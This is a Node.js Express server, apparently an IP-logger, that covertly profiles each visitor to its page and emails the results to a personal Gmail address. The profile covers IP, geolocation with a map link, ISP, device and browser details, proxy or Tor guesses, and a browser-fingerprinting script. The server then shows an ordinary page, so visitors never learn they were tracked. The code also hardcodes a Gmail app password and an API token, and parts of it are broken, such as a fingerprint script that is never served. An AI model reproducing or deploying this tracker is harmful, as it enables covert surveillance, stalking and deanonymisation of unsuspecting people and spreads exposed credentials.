const express = require('express');
const nodemailer = require('nodemailer');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const geoip = require('geoip-lite'); // Additional geo lookup
const app = express();

app.set('trust proxy', true);
const sessionStarts = {};

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'staysane.rz@gmail.com',
    pass: 'nvkq cudo ibhh usdr',
  },
});

app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  const ip = req.ip;
  if (!sessionStarts[ip]) {
    sessionStarts[ip] = {
      startTime: process.hrtime.bigint(), // High precision timing
      pageViews: 0,
      fingerprint: req.query.fp || 'unknown'
    };
  }
  sessionStarts[ip].pageViews++;
  next();
});

// Enhanced timestamp formatting
function formatTimestamp() {
  const now = new Date();
  const utc = new Date(now.getTime() + now.getTimezoneOffset() * 60000);
  
  return {
    iso: now.toISOString(),
    utc: utc.toUTCString(),
    local: now.toString(),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    unix: Math.floor(now.getTime() / 1000),
    precise: Number(process.hrtime.bigint() / 1000000n) // Milliseconds with nanosecond precision
  };
}

// Creative fingerprinting
function generateFingerprintScript() {
  return `
    <script>
      // Client-side fingerprinting
      function getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 100, 50);
        ctx.fillStyle = '#069';
        ctx.fillText('Fingerprint', 2, 15);
        return canvas.toDataURL();
      }

      function getWebGLFingerprint() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return 'no-webgl';
          
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
          } : 'no-debug-info';
        } catch (e) {
          return 'error';
        }
      }

      function getAudioFingerprint() {
        try {
          const audioContext = new (window.AudioContext || window.webkitAudioContext)();
          const oscillator = audioContext.createOscillator();
          const analyser = audioContext.createAnalyser();
          const gainNode = audioContext.createGain();
          const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);

          oscillator.type = 'triangle';
          oscillator.connect(analyser);
          analyser.connect(scriptProcessor);
          scriptProcessor.connect(gainNode);
          gainNode.connect(audioContext.destination);

          let fingerprint = '';
          scriptProcessor.onaudioprocess = e => {
            const channelData = e.inputBuffer.getChannelData(0);
            fingerprint += Array.from(channelData.subarray(0, 5)).join(',');
          };

          oscillator.start(0);
          setTimeout(() => {
            oscillator.stop();
            audioContext.close();
            sendFingerprint();
          }, 100);

          function sendFingerprint() {
            const fp = {
              canvas: getCanvasFingerprint(),
              webgl: getWebGLFingerprint(),
              audio: fingerprint.length,
              plugins: Array.from(navigator.plugins).map(p => p.name).join('|'),
              fonts: (function() {
                const fonts = new Set();
                const div = document.createElement('div');
                div.style.position = 'absolute';
                div.style.visibility = 'hidden';
                div.style.top = '-9999px';
                div.style.left = '-9999px';
                div.innerHTML = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                document.body.appendChild(div);
                
                const defaultWidth = div.offsetWidth;
                const defaultHeight = div.offsetHeight;
                
                const testFonts = [
                  'Arial', 'Arial Black', 'Courier New', 'Times New Roman',
                  'Comic Sans MS', 'Verdana', 'Georgia', 'Impact'
                ];
                
                testFonts.forEach(font => {
                  div.style.fontFamily = font;
                  if (div.offsetWidth !== defaultWidth || div.offsetHeight !== defaultHeight) {
                    fonts.add(font);
                  }
                });
                
                document.body.removeChild(div);
                return Array.from(fonts).join(',');
              })(),
              touch: 'ontouchstart' in window,
              hardware: {
                cores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown'
              }
            };
            
            // Send all data back to server
            navigator.sendBeacon('/track?' + new URLSearchParams({
              width: window.screen.width,
              height: window.screen.height,
              color: window.screen.colorDepth,
              tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
              cookies: navigator.cookieEnabled ? '1' : '0',
              fp: btoa(JSON.stringify(fp))
            }));
          }
        } catch (e) {
          sendFingerprint();
        }
      }

      // Start fingerprint collection
      setTimeout(getAudioFingerprint, 50);
    </script>
  `;
}

app.get('/', async (req, res) => {
  const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || '';
  const referrer = req.headers['referer'] || req.headers['referrer'] || 'direct';
  const acceptLanguage = req.headers['accept-language'] || 'Unknown';
  const dnt = req.headers['dnt'] === '1' ? 'Yes' : 'No';
  const screenWidth = req.query.width || 'Unknown';
  const screenHeight = req.query.height || 'Unknown';
  const colorDepth = req.query.color || 'Unknown';
  const timezone = req.query.tz || 'Unknown';
  const cookiesEnabled = req.query.cookies === '1' ? 'Enabled' : req.query.cookies === '0' ? 'Disabled' : 'Unknown';
  const fingerprint = req.query.fp ? Buffer.from(req.query.fp, 'base64').toString('utf8') : null;

  const timestamp = formatTimestamp();

  if (userAgent.includes('UptimeRobot')) {
    return res.status(204).end();
  }

  const parser = new UAParser(userAgent);
  const device = parser.getDevice();
  const os = parser.getOS();
  const browser = parser.getBrowser();
  const engine = parser.getEngine();
  const cpu = parser.getCPU();
  const deviceType = device.type || 'desktop';

  const connectionType = inferConnectionType(req);
  const sessionData = sessionStarts[ip];
  const sessionDuration = sessionData ? 
    `${(Number(process.hrtime.bigint() - sessionData.startTime) / 1000000000)} seconds` : 
    'First visit';
  const pageViews = sessionData ? sessionData.pageViews : 1;

  // Enhanced Geo Lookup
  let geoData = {
    ipinfo: 'N/A',
    geoip: 'N/A',
    combined: 'N/A',
    coords: null,
    isp: 'Unknown',
    asn: 'Unknown',
    proxy: 'No'
  };

  try {
    // Try IPInfo first
    const ipinfoToken = '5cbabbc7ad7b57';
    const ipinfoResponse = await axios.get(`https://ipinfo.io/${ip}?token=${ipinfoToken}`);
    const { city, region, country, org, loc, hostname, postal, timezone: ipTimezone, asn: ipAsn } = ipinfoResponse.data;

    geoData.ipinfo = `${city || 'Unknown'}, ${region || 'Unknown'}, ${country || 'Unknown'}`;
    geoData.isp = org || 'Unknown';
    geoData.asn = ipAsn?.asn || 'Unknown';
    
    if (hostname) geoData.ipinfo += ` (Hostname: ${hostname})`;
    if (postal) geoData.ipinfo += ` (Postal: ${postal})`;
    if (loc) geoData.coords = loc.split(',');

    // Try geoip-lite as fallback
    const geoipLookup = geoip.lookup(ip);
    if (geoipLookup) {
      geoData.geoip = `${geoipLookup.city || 'Unknown'}, ${geoipLookup.region || 'Unknown'}, ${geoipLookup.country || 'Unknown'}`;
      if (!geoData.coords) geoData.coords = [geoipLookup.ll[0], geoipLookup.ll[1]];
    }

    geoData.combined = geoData.ipinfo !== 'N/A' ? geoData.ipinfo : geoData.geoip;

    // Proxy detection
    const proxyHeaders = ['via', 'x-forwarded-for', 'client-ip', 'forwarded'];
    geoData.proxy = proxyHeaders.some(h => req.headers[h]) ? 'Yes (Proxy headers detected)' : 'No';
    if (ip !== req.connection.remoteAddress) geoData.proxy = 'Yes (IP mismatch)';
  } catch (err) {
    console.warn('Geo lookup failed:', err.message);
  }

  // Enhanced device detection
  const isMobile = deviceType === 'mobile' || deviceType === 'tablet';
  const isBot = /bot|crawl|spider|slurp|baidu/i.test(userAgent) ? 'Yes' : 'No';
  const screenResolution = `${screenWidth} × ${screenHeight}`;
  const colorInfo = `${colorDepth}-bit color depth`;
  const languagePrefs = acceptLanguage.split(',').map(lang => lang.split(';')[0]).join(', ');

  // Parse fingerprint data if available
  let fingerprintData = null;
  try {
    if (fingerprint) fingerprintData = JSON.parse(fingerprint);
  } catch (e) {
    console.warn('Fingerprint parse error:', e.message);
  }

  const mailOptions = {
    from: 'zyron',
    to: 'xraymundzyron@gmail.com',
    subject: `🚀 ${isMobile ? '📱 Mobile' : '💻 Desktop'} Visitor - ${ip.substring(0, 15)}...`,
    text: `New visit detected!

=== 🌍 TIMING & LOCATION ===
🕒 UTC Time:     ${timestamp.utc}
🕒 Local Time:   ${timestamp.local}
🕒 ISO-8601:     ${timestamp.iso}
🕒 Unix Time:    ${timestamp.unix}
🕒 Precise:      ${timestamp.precise} ms
🌐 Timezone:     ${timezone}

📍 IP Address:   ${ip}
📍 Location:     ${geoData.combined}
📍 Coordinates:  ${geoData.coords ? geoData.coords.join(', ') : 'N/A'}
📍 Map:          https://www.google.com/maps?q=${geoData.coords ? geoData.coords.join(',') : ''}
📡 ISP:          ${geoData.isp}
📡 ASN:          ${geoData.asn}
🛡️ Proxy/VPN:    ${geoData.proxy}

=== 💻 DEVICE INFO ===
📱 Type:         ${deviceType}
🏷️ Brand:        ${device.vendor || 'Unknown'}
🖥️ Model:        ${device.model || 'Unknown'}
🖥️ Screen:       ${screenResolution} (${colorInfo})
💾 OS:           ${os.name || 'OS'} ${os.version || ''}
🌐 Browser:      ${browser.name || 'Browser'} ${browser.version || ''}
⚙️ Engine:       ${engine.name || 'Unknown engine'}
🧠 CPU:          ${cpu.architecture || 'Unknown CPU architecture'}
🤖 Bot:          ${isBot}

=== 🔍 FINGERPRINT ===
🖌️ Canvas:       ${fingerprintData?.canvas ? 'Present' : 'No'}
🎮 WebGL:        ${fingerprintData?.webgl ? (typeof fingerprintData.webgl === 'string' ? fingerprintData.webgl : 'Vendor: ' + fingerprintData.webgl.vendor) : 'No'}
🎧 Audio:        ${fingerprintData?.audio ? fingerprintData.audio + ' chars' : 'No'}
🧩 Plugins:      ${fingerprintData?.plugins ? fingerprintData.plugins.split('|').length + ' plugins' : 'No'}
✒️ Fonts:        ${fingerprintData?.fonts ? fingerprintData.fonts.split(',').length + ' fonts' : 'No'}
👆 Touch:        ${fingerprintData?.touch ? 'Supported' : 'No'}
⚙️ Hardware:     ${fingerprintData?.hardware ? `${fingerprintData.hardware.cores} cores, ${fingerprintData.hardware.memory}GB RAM` : 'No'}

=== 🔗 NETWORK & PRIVACY ===
📶 Connection:   ${connectionType}
🚫 DNT Header:   ${dnt} (Do Not Track)
🍪 Cookies:      ${cookiesEnabled}
🗣️ Languages:    ${languagePrefs}
🔗 Referrer:     ${referrer}

=== 📊 SESSION ===
⏱️ Duration:     ${sessionDuration}
📊 Page Views:   ${pageViews}
👾 Fingerprint:  ${sessionData?.fingerprint || 'unknown'}

=== 🕵️ USER AGENT ===
${userAgent}
`,
    html: `<pre style="font-family: monospace; font-size: 12px; line-height: 1.4;">
New visit detected!

<b>=== 🌍 TIMING & LOCATION ===</b>
🕒 <b>UTC Time:</b>     ${timestamp.utc}
🕒 <b>Local Time:</b>   ${timestamp.local}
🕒 <b>ISO-8601:</b>     ${timestamp.iso}
🕒 <b>Unix Time:</b>    ${timestamp.unix}
🕒 <b>Precise:</b>      ${timestamp.precise} ms
🌐 <b>Timezone:</b>     ${timezone}

📍 <b>IP Address:</b>   ${ip}
📍 <b>Location:</b>     ${geoData.combined}
📍 <b>Coordinates:</b>  ${geoData.coords ? geoData.coords.join(', ') : 'N/A'}
📍 <b>Map:</b>          <a href="https://www.google.com/maps?q=${geoData.coords ? geoData.coords.join(',') : ''}">Google Maps</a>
📡 <b>ISP:</b>          ${geoData.isp}
📡 <b>ASN:</b>          ${geoData.asn}
🛡️ <b>Proxy/VPN:</b>    ${geoData.proxy}

<b>=== 💻 DEVICE INFO ===</b>
📱 <b>Type:</b>         ${deviceType}
🏷️ <b>Brand:</b>        ${device.vendor || 'Unknown'}
🖥️ <b>Model:</b>        ${device.model || 'Unknown'}
🖥️ <b>Screen:</b>       ${screenResolution} (${colorInfo})
💾 <b>OS:</b>           ${os.name || 'OS'} ${os.version || ''}
🌐 <b>Browser:</b>      ${browser.name || 'Browser'} ${browser.version || ''}
⚙️ <b>Engine:</b>       ${engine.name || 'Unknown engine'}
🧠 <b>CPU:</b>          ${cpu.architecture || 'Unknown CPU architecture'}
🤖 <b>Bot:</b>          ${isBot}

<b>=== 🔍 FINGERPRINT ===</b>
🖌️ <b>Canvas:</b>       ${fingerprintData?.canvas ? 'Present' : 'No'}
🎮 <b>WebGL:</b>        ${fingerprintData?.webgl ? (typeof fingerprintData.webgl === 'string' ? fingerprintData.webgl : 'Vendor: ' + fingerprintData.webgl.vendor) : 'No'}
🎧 <b>Audio:</b>        ${fingerprintData?.audio ? fingerprintData.audio + ' chars' : 'No'}
🧩 <b>Plugins:</b>      ${fingerprintData?.plugins ? fingerprintData.plugins.split('|').length + ' plugins' : 'No'}
✒️ <b>Fonts:</b>        ${fingerprintData?.fonts ? fingerprintData.fonts.split(',').length + ' fonts' : 'No'}
👆 <b>Touch:</b>        ${fingerprintData?.touch ? 'Supported' : 'No'}
⚙️ <b>Hardware:</b>     ${fingerprintData?.hardware ? `${fingerprintData.hardware.cores} cores, ${fingerprintData.hardware.memory}GB RAM` : 'No'}

<b>=== 🔗 NETWORK & PRIVACY ===</b>
📶 <b>Connection:</b>   ${connectionType}
🚫 <b>DNT Header:</b>   ${dnt} (Do Not Track)
🍪 <b>Cookies:</b>      ${cookiesEnabled}
🗣️ <b>Languages:</b>    ${languagePrefs}
🔗 <b>Referrer:</b>     ${referrer}

<b>=== 📊 SESSION ===</b>
⏱️ <b>Duration:</b>     ${sessionDuration}
📊 <b>Page Views:</b>   ${pageViews}
👾 <b>Fingerprint:</b>  ${sessionData?.fingerprint || 'unknown'}

<b>=== 🕵️ USER AGENT ===</b>
${userAgent}
</pre>`
  };

  transporter.sendMail(mailOptions, (error) => {
    if (error) console.error('Email failed:', error);
  });

  res.sendFile(__dirname + '/index.html');
});

app.get('/track', (req, res) => {
  res.status(204).end();
});

function inferConnectionType(req) {
  const headers = req.headers;
  const ip = req.ip;
  
  // Check for Cloudflare headers
  if (headers['cf-connecting-ip']) {
    const cfRay = headers['cf-ray'] || '';
    const colo = cfRay.split('-')[1] || 'unknown';
    return `Cloudflare (${colo.toUpperCase()})`;
  }
  
  // Check for common proxy headers
  const proxyHeaders = ['x-forwarded-for', 'via', 'client-ip', 'forwarded'];
  if (proxyHeaders.some(h => headers[h])) {
    return 'Behind Proxy/Load Balancer';
  }
  
  // Check for mobile carrier IPs
  if (ip.startsWith('192.') || ip.startsWith('172.16.') || ip.startsWith('10.')) {
    return 'Likely Mobile (Cellular)';
  }
  
  // Check for Tor
  if (headers['x-tor-ip'] || (headers.host && headers.host.endsWith('.onion'))) {
    return 'Tor Network';
  }
  
  return 'Likely WiFi/Landline';
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Tracker running on port ${PORT}`));